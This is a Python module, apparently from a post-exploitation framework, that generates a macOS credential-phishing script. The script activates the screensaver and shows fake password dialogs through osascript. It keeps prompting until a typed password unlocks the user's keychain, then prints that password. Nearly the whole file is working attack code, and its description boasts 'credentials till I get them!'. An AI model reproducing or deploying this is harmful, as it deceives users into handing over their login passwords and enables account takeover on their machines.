class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'ScreensaverAlleyOop',
            'Author': ['@FuzzyNop', '@harmj0y', '@enigma0x3', '@Killswitch-GUI'],
            'Description': ('Launches a screensaver with a prompt for credentials with osascript. '
                            'This locks the user out until the password can unlock the user keychain. '
                            'This allows you to prevent Sudo/su failed logon attempts. (credentials till I get them!)'),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                "https://github.com/fuzzynop/FiveOnceInYourLife",
                "https://github.com/enigma0x3/Invoke-LoginPrompt"
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ExitCount' : {
                'Description'   :   'Exit Screensaver after # of attempts',
                'Required'      :   True,
                'Value'         :   '15'
            },
            'Verbose' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   'False'
            },
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        exitCount = self.options['ExitCount']['Value']
        verbose = self.options['Verbose']['Value']
        script = '''
import subprocess
import time
import sys
def myrun(cmd):
    """from http://blog.kagesenshi.org/2008/02/teeing-python-subprocesspopen-output.html"""
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout = []
    while True:
        line = p.stdout.readline()
        stdout.append(line)
        if line == '' and p.poll() != None:
            break
    return ''.join(stdout)
def lockchain():
    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
def unlockchain(password):
    cmd = 'security unlock-keychain -p ' + str(password)
    text = myrun(cmd)
    if text == '':
        return True
    else:
        return False
def retrypassword():
    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "Login"'""", stdout=subprocess.PIPE, shell=True)
    text = process.communicate()
    return text[0]
def parse(text):
    text = text.split(':')
    password = text[-1]
    password.rstrip('\\n')
    password.rstrip('\\r')
    password.replace('!','%%21')
    password.replace('#','%%23')
    password.replace('$','%%24')
    return password
def run(exitCount, verbose=False):
    try:
        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
        text = process.communicate()
        text = text[0]
        count = 0
        while True:
            if exitCount:
                count += 1
                if count > exitCount:
                    break
            if 'button returned:OK, text returned:' in text:
                password = parse(text)
                if password:
                    lockchain()
                    correct = unlockchain(password)
                    if correct:
                        print '[!] unlock-keychain passed: ' + str(password)
                        break
                    else:
                        print "[*] Bad password: " + str(password)
                        text = retrypassword()
            else:
                text = retrypassword()
    except Exception as e:
        print e
exitCount = %s
verbose = %s
run(exitCount, verbose=verbose)
''' %(exitCount, verbose)
        return script